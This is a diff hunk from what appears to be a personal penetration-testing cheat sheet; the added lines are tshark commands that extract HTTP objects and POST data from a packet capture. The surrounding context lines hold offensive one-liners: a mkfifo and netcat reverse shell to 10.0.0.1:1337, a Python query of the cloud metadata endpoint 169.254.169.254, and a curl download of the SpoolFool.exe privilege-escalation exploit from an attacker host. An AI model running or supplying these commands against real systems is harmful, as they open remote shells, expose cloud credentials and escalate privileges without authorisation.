@@ -7,6 +7,13 @@ mkfifo /tmp/.zK; nc 10.0.0.1 1337 0</tmp/.zK | /bin/sh >/tmp/.zK 2>&1; rm /tmp/.
 python -c 'import urllib.request; print(urllib.request.urlopen("http://169.254.169.254/latest/meta-data/").read(999))'
 
 
+# Wireshark (extract http to "httpout/")
+tshark -r dump.pcap --export-objects=http,httpout
+
+# Wireshark (extract POST data)
+tshark -r dump.pcap -Y "http.request.method == POST" -T fields -e text
+
+
 # Windows
 
 curl.exe 192.168.45.226:8082/SpoolFool.exe -o SpoolFool.exe
